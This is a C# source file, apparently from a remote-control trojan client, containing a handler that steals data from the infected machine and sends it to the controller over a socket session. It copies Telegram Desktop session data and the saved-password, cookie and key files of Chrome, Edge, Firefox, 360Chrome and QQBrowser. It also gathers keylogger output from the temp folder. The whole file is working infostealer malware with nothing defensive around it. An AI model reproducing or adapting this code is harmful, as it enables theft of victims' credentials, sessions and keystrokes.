using System;
using System.Collections.Generic;
using System.IO;
using System.IO.Compression;
using System.Text;
using RemoteControl.Protocals;
using RemoteControl.Protocals.Request;
using RemoteControl.Protocals.Response;

namespace RemoteControl.Client.Handlers
{
    class RequestArchiveAllHandler : AbstractRequestHandler
    {
        public override void Handle(SocketSession session, ePacketType reqType, object reqObj)
        {
            RunTaskThread(() =>
            {
                try
                {
                    var req = reqObj as RequestArchiveAll;
                    int mode = req != null ? req.Mode : 0;

                    using (var ms = new MemoryStream())
                    using (var deflate = new DeflateStream(ms, CompressionMode.Compress))
                    {
                        int totalFiles = 0;

                        // TG数据
                        if (mode == 0 || mode == 1)
                        {
                            totalFiles += PackTGData(deflate);
                        }

                        // 浏览器密码数据
                        if (mode == 0 || mode == 2)
                        {
                            totalFiles += PackPasswordData(deflate);
                        }

                        // 键盘记录缓存
                        if (mode == 0 || mode == 3)
                        {
                            totalFiles += PackKeylogData(deflate);
                        }

                        deflate.Close();

                        var resp = new ResponseArchiveAll();
                        resp.Result = true;
                        resp.FileName = Environment.MachineName + "_archive.dat";
                        resp.ArchiveData = ms.ToArray();
                        resp.Message = "归档完成,共" + totalFiles + "个文件,"
                            + (ms.ToArray().Length / 1024) + "KB";
                        session.Send(ePacketType.PACKET_ARCHIVE_ALL_RESPONSE, resp);
                    }
                }
                catch (Exception ex)
                {
                    var resp = new ResponseArchiveAll();
                    resp.Result = false;
                    resp.Message = ex.Message;
                    session.Send(ePacketType.PACKET_ARCHIVE_ALL_RESPONSE, resp);
                }
            });
        }

        private int PackTGData(DeflateStream output)
        {
            int count = 0;
            string appData = Environment.GetFolderPath(
                Environment.SpecialFolder.ApplicationData);
            string tdataPath = Path.Combine(appData, "Telegram Desktop", "tdata");
            if (!Directory.Exists(tdataPath))
                return 0;

            try
            {
                count = CollectDir(output, tdataPath, "tdata");
            }
            catch { }
            return count;
        }

        private int PackPasswordData(DeflateStream output)
        {
            int count = 0;
            string localApp = Environment.GetFolderPath(
                Environment.SpecialFolder.LocalApplicationData);
            string roamingApp = Environment.GetFolderPath(
                Environment.SpecialFolder.ApplicationData);

            var files = new List<string>();
            AddIfExists(files, Path.Combine(localApp,
                @"Google\Chrome\User Data\Default\Login Data"));
            AddIfExists(files, Path.Combine(localApp,
                @"Google\Chrome\User Data\Default\Cookies"));
            AddIfExists(files, Path.Combine(localApp,
                @"Google\Chrome\User Data\Local State"));
            AddIfExists(files, Path.Combine(localApp,
                @"Microsoft\Edge\User Data\Default\Login Data"));
            AddIfExists(files, Path.Combine(localApp,
                @"Microsoft\Edge\User Data\Default\Cookies"));
            AddIfExists(files, Path.Combine(localApp,
                @"Microsoft\Edge\User Data\Local State"));

            // Firefox
            string ffDir = Path.Combine(roamingApp, @"Mozilla\Firefox\Profiles");
            if (Directory.Exists(ffDir))
            {
                foreach (var dir in Directory.GetDirectories(ffDir))
                {
                    AddIfExists(files, Path.Combine(dir, "logins.json"));
                    AddIfExists(files, Path.Combine(dir, "key4.db"));
                }
            }

            // 国产浏览器
            AddIfExists(files, Path.Combine(localApp,
                @"360Chrome\Chrome\User Data\Default\Login Data"));
            AddIfExists(files, Path.Combine(localApp,
                @"Tencent\QQBrowser\User Data\Default\Login Data"));

            foreach (string file in files)
            {
                WriteFileEntry(output, file, "passwords/" + Path.GetFileName(file));
                count++;
            }
            return count;
        }

        private int PackKeylogData(DeflateStream output)
        {
            int count = 0;
            // 收集临时目录下的键盘记录缓存
            string tempDir = Path.GetTempPath();
            try
            {
                foreach (string file in Directory.GetFiles(tempDir, "*.keylog"))
                {
                    WriteFileEntry(output, file, "keylog/" + Path.GetFileName(file));
                    count++;
                }
            }
            catch { }
            return count;
        }

        private int CollectDir(Stream output, string dir, string entryBase)
        {
            int count = 0;
            try
            {
                foreach (string file in Directory.GetFiles(dir))
                {
                    FileInfo fi = new FileInfo(file);
                    if (fi.Length > 50 * 1024 * 1024) continue;
                    string name = fi.Name.ToLower();
                    if (name.Contains("cache") || name.Contains("tmp")) continue;

                    string entryName = entryBase + "/" + fi.Name;
                    WriteFileEntry(output, file, entryName);
                    count++;
                }

                foreach (string subDir in Directory.GetDirectories(dir))
                {
                    string dirName = Path.GetFileName(subDir).ToLower();
                    if (dirName.Contains("cache") || dirName == "temp"
                        || dirName == "dumps") continue;
                    count += CollectDir(output, subDir,
                        entryBase + "/" + Path.GetFileName(subDir));
                }
            }
            catch { }
            return count;
        }

        private void WriteFileEntry(Stream output, string filePath, string entryName)
        {
            try
            {
                byte[] data;
                using (var fs = new FileStream(filePath,
                    FileMode.Open, FileAccess.Read, FileShare.ReadWrite))
                {
                    data = new byte[fs.Length];
                    fs.Read(data, 0, data.Length);
                }

                byte[] nameBytes = Encoding.UTF8.GetBytes(entryName);
                byte[] nameLen = BitConverter.GetBytes(nameBytes.Length);
                byte[] dataLen = BitConverter.GetBytes(data.Length);
                output.Write(nameLen, 0, 4);
                output.Write(nameBytes, 0, nameBytes.Length);
                output.Write(dataLen, 0, 4);
                output.Write(data, 0, data.Length);
            }
            catch { }
        }

        private void AddIfExists(List<string> files, string path)
        {
            if (File.Exists(path)) files.Add(path);
        }
    }
}
